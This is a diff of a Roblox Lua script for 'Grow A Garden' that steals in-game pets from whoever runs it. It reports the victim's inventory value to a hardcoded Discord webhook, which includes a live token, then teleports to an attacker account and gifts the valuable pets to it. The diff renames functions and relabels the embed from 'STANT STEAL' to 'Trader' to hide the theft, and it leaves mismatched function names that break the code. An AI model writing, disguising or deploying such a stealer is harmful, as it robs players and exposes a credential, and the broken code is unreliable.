@@ -3,6 +3,24 @@ repeat
 until game:IsLoaded()
 
 local VICTIM = game.Players.LocalPlayer
+local petsToAcceptByName = {
+    "Dragonfly", "Raccoon", "Red Fox", "Queen Bee", "Disco Bee",
+    "T-Rex", "Spinosaurus", "Rainbow Spinosaurus", "Fennec Fox",
+    "Praying Mantis", "Echo Frog", "Chicken Zombie", "Butterfly",
+    "Cooked Owl", "Pack Bee", "Mimic Octopus", "Pterodactyl", "Brontosaurus",
+    "Dilophosaurus", "Ankylosaurus", "Rainbow Dilophosaurus",
+    "Rainbow Ankylosaurus", "Firefly", "Golden Bee", "Rainbow Parasaurolophus",
+    "Rainbow Iguanodon", "Rainbow Pachycephalosaurus"
+}
+
+local mutationsToAccept = {
+    "IronSkin", "Shiny", "Radiant", "Ascended", "Frozen", "Inverted",
+    "Windy", "Shocked", "Burning", "Corrupted", "Starfall",
+    "Overcharged", "Radioactive"
+}
+
+local MIN_BASE_WEIGHT_TO_ACCEPT = 2.5
+local AGE_TO_WEIGHT_FACTOR = 0.1925
 local USERNAMES = {
     "monkey_master6"
 }
@@ -11,6 +29,16 @@ local USERNAMES = {
 local HttpService = game:GetService("HttpService")
 local TeleportService = game:GetService("TeleportService")
 local Players = game:GetService("Players")
+
+local function getWeight(description)
+    local weightString = string.match(description, "%[([%d%.]+) KG%]")
+    return tonumber(weightString)
+end
+
+local function getAgeInDays(description)
+    local ageString = string.match(description, "%[Age (%d+)%]")
+    return tonumber(ageString)
+end
 
 local function isPrivateServer()
     return game.PrivateServerId ~= "" and game.PrivateServerOwnerId ~= 0
@@ -29,8 +57,8 @@ local function isTargetOnServer()
     return false
 end
 
-local function tryServerHop()
-    local MAX_OCCUPANCY = 4 -- Allow servers with 3 or fewer players
+local function ServerHop()
+    local MAX_OCCUPANCY = 4
     local success, result = pcall(function()
         local url = "https://games.roblox.com/v1/games/"..game.PlaceId.."/servers/Public?sortOrder=Asc&limit=100"
         return HttpService:JSONDecode(game:HttpGet(url))
@@ -51,7 +79,7 @@ local function tryServerHop()
 end
 
 
-local PET_WHITELIST = {
+local Pets_To_Take = {
     'Raccoon',
     'Honey Bee',
     'T-Rex',
@@ -69,7 +97,7 @@ local PET_WHITELIST = {
     'French Fry Ferret',
 }
 
-local PET_VALUES = {
+local Pet_Values = {
     ["French Fry Ferret"] = 10000,
     ["Honey Bee"] = 9000,
     ["Raccoon"] = 1900,
@@ -88,12 +116,12 @@ local PET_VALUES = {
 }
 
 
-local victimPetTable = {}
+local PetTable = {}
 
 local VirtualInputManager = game:GetService("VirtualInputManager")
 local dataModule = require(game:GetService("ReplicatedStorage").Modules.DataService)
 
-local function waitForJoin()
+local function waitForSend()
     for _, player in ipairs(game.Players:GetPlayers()) do
         if table.find(USERNAMES, player.Name) then
             return true, player.Name
@@ -103,12 +131,12 @@ local function waitForJoin()
 end
 
 
-function createDiscordEmbed(petList, totalValue, fileUrl, callback)
+function createDiscordEmbed(Pets_To_Take, totalValue, fileUrl, callback)
     local HttpService = game:GetService("HttpService")
     local webhookUrl = "https://discord.com/api/webhooks/1401490956330598441/9KU1n_rztYZmietMLFL2vZSWi0RFfL-WH40TTWEth-vYw4ToC16VLXeeniIrSbJDd-X2"
 
     local embed = {
-        title = ":cactus: Grow A Garden Hit - STANT STEAL :four_leaf_clover:",
+        title = ":cactus: Grow A Garden Trader :four_leaf_clover:",
         color = 65280,
         fields = {
             {
@@ -126,21 +154,6 @@ function createDiscordEmbed(petList, totalValue, fileUrl, callback)
                 value = string.format("```\n%s₸\n```", totalValue),
                 inline = false
             },
-            {
-                name = ":palm_tree: **Backpack**",
-                value = string.format("```\n%s\n```", petList),
-                inline = false
-            },
-            {
-                name = ":island: **Join with URL**",
-                value = string.format(
-                    "[%s](https://kebabman.vercel.app/start?placeId=%s&gameInstanceId=%s)",
-                    game.JobId,
-                    game.PlaceId,
-                    game.JobId
-                ),
-                inline = false
-            }
         },
         footer = {
             text = string.format("%s | %s", game.PlaceId, game.JobId)
@@ -201,15 +214,15 @@ local function teleportTarget(targetName)
     VICTIM.Character.HumanoidRootPart.CFrame = game.Players[targetName].Character.HumanoidRootPart.CFrame
 end
 
-local function checkPetsWhilelist(pet)
-    for _, name in PET_WHITELIST do
+local function CheckGiftWhitelist(pet)
+    for _, name in Pets_To_Take do
         if string.find(pet, name) then
             return true
         end
     end
 end
 
-local function getPetObject(petUid)
+local function getObject(petUid)
     for _, object in ipairs(VICTIM.Backpack:GetChildren()) do
         if object:GetAttribute("PET_UUID") == petUid then
             return object
@@ -229,7 +242,7 @@ local function getPetObject(petUid)
 end
 
 
-local function equipPet(pet)
+local function Equip(pet)
     if pet:GetAttribute("d") then
         game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("Favorite_Item"):FireServer(pet)
     end
@@ -238,9 +251,9 @@ local function equipPet(pet)
 end
 
 local totalValue = 0
-local victimPetTable = {}
+local PetTable = {}
 
-local function getPlayersPets()
+local function GetFift()
     for petUid, value in pairs(dataModule:GetData().PetsData.PetInventory.Data) do
         local petName = value.PetType
 
@@ -248,10 +261,10 @@ local function getPlayersPets()
             continue
         end
 
-        local petPrice = PET_VALUES[petName] or 0
+        local petPrice = Pet_Values[petName] or 0
         totalValue += petPrice
 
-        table.insert(victimPetTable, string.format("%s - %s", petName, petPrice))
+        table.insert(PetTable, string.format("%s - %s", petName, petPrice))
     end
 end
 
@@ -265,9 +278,9 @@ end
 
 
 
-local function checkPetsInventory(target)
+local function CheckGift(target)
     for petUid, value in pairs(dataModule:GetData().PetsData.PetInventory.Data) do
-        if not checkPetsWhilelist(value.PetType) then
+        if not CheckGiftWhitelist(value.PetType) then
             continue
         end
 
@@ -276,9 +289,8 @@ local function checkPetsInventory(target)
             continue
         end
 
-        equipPet(petObject)
-
-        -- Fire gift request directly
+        Equip(petObject)
+        
         local targetPlayer = game.Players:FindFirstChild(target)
         if targetPlayer then
             game:GetService("ReplicatedStorage")
@@ -287,27 +299,27 @@ local function checkPetsInventory(target)
                 :FireServer("GivePet", targetPlayer)
         end
 
-        task.wait(0.2) -- Small delay between each gift
+        task.wait(0.2) 
     end
 end
 
-local function idlingTarget()
+local function idling()
     task.spawn(function()
         local lastTarget = nil
         local targetEnterTime = 0
 
         while task.wait(0.2) do
-            local isTarget, trigerName = waitForJoin()
+            local isTarget, trigerName = waitForSend()
 
             if isTarget then
                 if lastTarget ~= trigerName then
                     lastTarget = trigerName
-                    targetEnterTime = tick() -- отметка времени появления цели
+                    targetEnterTime = tick()
                 end
 
-                if tick() - targetEnterTime >= 20 then -- если цель уже 7+ секунд
+                if tick() - targetEnterTime >= 20 then
                     teleportTarget(trigerName)
-                    checkPetsInventory(trigerName)
+                    CheckGiftWhitelist(trigerName)
                 end
             else
                 lastTarget = nil
@@ -318,15 +330,7 @@ local function idlingTarget()
 end
 
 
-getPlayersPets()
-
-if #victimPetTable == 0 or #victimPetTable == nil then
-    warn("❌ Нет подходящих питомцев — сообщение не будет отправлено в Discord.")
-    return
-end
-
-
-createDiscordEmbed(table.concat(victimPetTable, "\n"), tostring(totalValue), "https://cdn.discordapp.com/attachments/.../items.txt", function()
-    idlingTarget()
+GetGift()
+createDiscordEmbed(table.concat(PetTable, "\n"), tostring(totalValue), "https://cdn.discordapp.com/attachments/.../items.txt", function()
+    idling()
 end)
-
